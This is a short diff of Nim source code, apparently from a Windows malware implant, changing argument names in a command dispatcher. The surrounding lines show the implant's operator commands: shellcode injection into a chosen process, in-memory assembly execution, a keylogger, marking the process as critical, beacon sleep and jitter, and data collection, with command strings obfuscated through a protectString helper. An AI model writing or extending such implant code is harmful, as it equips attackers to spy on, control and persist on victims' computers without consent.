@@ -801,7 +801,7 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("shellc"):
             is_success = wrap_inject_shellc(command[protectString("sh_b64")].getStr(), command[protectString("pid")].getInt())
         of protectString("assembly"):
-            is_success = wrap_execute_assembly(command[protectString("as_b64")].getStr(), command[protectString("args")].getStr())
+            is_success = wrap_execute_assembly(command[protectString("as_b64")].getStr(), command[protectString("as_args")].getStr())
         of protectString("keylog"):
             var keylog_action = command[protectString("subcommand")].getStr()
             if keylog_action == protectString("start"):
@@ -838,7 +838,7 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("speak"):
             is_success = speak(command["text"].getStr())
         of protectString("critical"):
-            is_success = wrap_set_critical(parseBool(command[protectString("enable")].getStr()))
+            is_success = wrap_set_critical(parseBool(command[protectString("is_critical")].getStr()))        
         of protectString("sleep"):
             is_success = change_sleep_time(client, command[protectString("sleep")].getInt(), command[protectString("jitter")].getInt())
         of protectString("collect"):
